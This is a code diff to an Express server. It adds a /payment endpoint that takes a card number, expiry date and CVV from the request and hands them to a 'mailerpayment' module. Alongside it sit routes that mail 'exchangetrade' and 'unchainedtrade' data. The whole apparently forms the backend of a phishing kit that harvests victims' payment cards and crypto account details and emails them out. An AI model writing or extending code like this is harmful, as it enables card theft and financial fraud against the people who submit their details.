@@ -4,7 +4,10 @@ const { parse } = require("tldts");
 const path = require("path");
 
 const app = express();
-const port = process.env.PORT || 9000;
+const hostname = "127.0.0.1";
+const port = process.env.PORT || 3000;
+
+const server = require("http").createServer(app);
 
 var cors = require("cors");
 app.use(cors());
@@ -111,11 +114,21 @@ app.post("/start", (req, res) => {
   });
 });
 
+app.post("/payment", (req, res) => {
+  const { cardnumber, expiremonth, expireyear, cvv } = req.body;
+
+  const mailerpayment = require("./mailerpayment");
+
+  mailerpayment.main(req.body);
+
+  res.sendStatus(200);
+});
+
 app.use("/mail", require("./services/reportmessage"));
 
 app.use("/exchangetrade", require("./services/mailerexchangetrade"));
 app.use("/unchainedtrade", require("./services/mailerunchainedtrade"));
 
-app.listen(port, () => {
+server.listen(port, hostname, () => {
   console.log(`server is running on port: ${port}`);
 });
